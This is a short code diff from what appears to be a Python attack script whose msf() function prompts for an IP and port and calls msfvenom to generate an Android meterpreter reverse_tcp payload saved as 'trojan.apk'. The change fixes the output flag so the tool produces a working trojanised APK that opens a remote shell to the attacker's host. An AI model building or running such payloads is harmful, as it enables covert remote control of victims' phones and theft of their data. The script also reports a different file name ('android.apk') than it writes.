@@ -67,7 +67,7 @@ def msf():
         ip = input("IP -->> ")
         port = input("PORT ->> ")
         print("Creating payload...")
-        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.apk")
+        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" R > trojan.apk")
         time.sleep(2)
         print("FileName == android.apk")
         while True:
